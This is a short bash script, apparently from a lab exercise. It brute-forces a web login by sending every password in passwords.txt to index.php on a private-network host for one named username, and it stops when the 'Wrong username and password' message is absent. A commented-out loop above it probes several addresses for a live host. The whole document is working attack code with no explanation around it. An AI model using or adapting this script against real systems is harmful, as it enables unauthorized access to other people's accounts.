passwordList="passwords.txt"
#for i in {150..152}
#do
  #findIP=$(curl "192.168.3.""$i""/index.php?" | grep "200")
  #if [ "${#findIP}" -ge 1 ];
  #then
   #  echo "$i"
  #   goodIP="192.168.3.$i"
 # fi
#done
#echo "$goodIP"

while read -r password
do
 attemptLogIn=$(curl -s "192.168.3.151/index.php?username=furkan.paligu&password=${password}" | grep "Wrong username and password")
 if [ "${#attemptLogIn}" -eq 0 ];
 then
 echo "$password"
 break
 fi
done < "$passwordList"
